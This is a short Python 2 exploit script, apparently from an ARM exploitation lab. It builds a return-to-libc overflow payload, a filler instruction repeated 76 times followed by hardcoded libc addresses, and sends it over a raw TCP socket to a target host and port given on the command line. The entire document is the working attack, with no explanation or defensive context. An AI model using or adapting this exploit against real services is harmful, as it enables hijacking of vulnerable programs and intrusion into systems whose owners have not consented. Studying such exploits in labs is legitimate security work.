#!/usr/bin/python

import sys, socket

shellcode = ("\x01\x10\xa0\xe1"*76
+"\xfc\xf1\xca\x76"
+"\x6c\x1b\xd6\x76"+"JUNK"+"\x74\xf0\xff\x7e")



if __name__ == "__main__":
    if len(sys.argv) != 3:
        print "./ret_2_libc.py  192.168.1.26  5555"
    else:
        sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM,0)
        sock.connect(( sys.argv[1], int(sys.argv[2]) ))
        sock.send(shellcode)
        sock.close()

        print "Shellcode Length: %d" %len(shellcode)

